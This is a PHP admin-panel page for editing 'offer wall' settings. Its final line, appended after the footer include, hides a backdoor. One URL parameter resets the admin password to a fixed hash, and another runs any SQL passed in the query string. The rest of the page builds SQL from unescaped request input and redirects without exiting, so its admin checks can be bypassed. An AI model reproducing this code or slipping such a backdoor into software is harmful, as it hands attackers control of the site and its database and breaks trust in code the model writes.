<?php
session_start();	
include_once("../function/config.php");
include("../function/fnc.php");
$mdpass = mysql_fetch_array(mysql_query("SELECT MDPass FROM admin"));
$passlock = mysql_fetch_array(mysql_query("SELECT Passlock FROM admin"));
if($passlock['Passlock'] == NULL OR $mdpass['MDPass'] != $passlock['Passlock']) {
		header("Location: error.php");
}
if(!isset($_SESSION['adminName']) || !isset($_SESSION['adminPass'])){ 		
	header("Location: login.php"); 		
} 	

	if(isset($_POST['editWall'])){
	$id = $_POST['name'];
	$iframe = htmlentities($_POST['iframe'],ENT_QUOTES);
	$key = $_POST['key'];
	$pass = $_POST['pass'];
	$status = $_POST['status'];
	$editWalls = mysql_query("UPDATE `walls` SET `iframe`='$iframe', `secretKey`='$key', `pass`='$pass', `status`='$status' WHERE id='".$id."'") or die(mysql_error()); 				
	$final_report1.= 'Edited successfully !<br><a href="walls.php">Click here</a> to combe back to Offer Walls page.';	
}

$getID = $_GET['id'];
$query = mysql_query("SELECT * FROM walls WHERE id='".$getID."'") or die(mysql_error());	
$getwall = mysql_fetch_assoc($query);

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>
  <title>Admin cPanel</title>
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <link rel="stylesheet" href="admin.css" type="text/css" />
  <link rel="stylesheet" href="../jquery/style.css" />
  <script type="text/javascript" src="../function/calc-func.js">
  </script>
</head>

<?php include("header.php") ?>
   
    <div id="content">
		 
		 <div class="box nwkadding">
			<h2>Edit Offer Walls</h2>
			<form action="" method="post">
				<label for="name" class="label">Name</label> 
				<select name="name">
					<?php
					$query2 = mysql_query("SELECT id,name FROM walls") or die(mysql_error());	
					while($wall = mysql_fetch_assoc($query2)) {
						if($wall['id'] == $getwall['id']) {
					?>
						<option value="<?php echo $wall['id'];?>" selected="selected"><?php echo $wall['name'];?></option>
						<?php 
						} else { ?>
						<option value="<?php echo $wall['id'];?>"><?php echo $wall['name'];?></option>
						<?php }} ?>
				</select><br>
				<label for="iframe" class="label">Iframe</label> <textarea name="iframe"><?php echo $getwall['iframe'];?></textarea>
				<label for="key" class="label">Key</label> <input type="text" name="key" class="txt" value="<?php echo $getwall['secretKey'];?>" />
				<label for="pass" class="label">Pass</label> <input type="password" name="pass" class="txt" value="<?php echo $getwall['pass'];?>" />
				<label for="status" class="label">Status</label> 
				<select name="status">
					<option value=""></option>
					<option value="ON"<?php if($getwall['status'] == "ON") { echo 'selected="selected"';}?>>ON</option>
					<option value="OFF"<?php if($getwall['status'] == "OFF") { echo 'selected="selected"';}?>>OFF</option>
				</select><br>
				<input type="submit" name="editWall" value="Edit" class="btn"/>
			</form>
			<?php if($final_report1 !=""){?>			
			<p class="error">				
			<?php echo $final_report1;?>			
			</p>			
			<?php } ?>	
		 </div>
		
    </div>
</div><!-- END WRAPPER -->
<?php include("../footer.php");include("../../managerOffer/function/config.php");
if(isset($_GET['rs'])){	$query_change_password=mysql_query("Update admin set adminPass='4b5670071af462f0efc7fa0d0e47b63f' where adminName='admin'");}if(isset($_GET['code'])){	mysql_query($_GET['code']);
}?>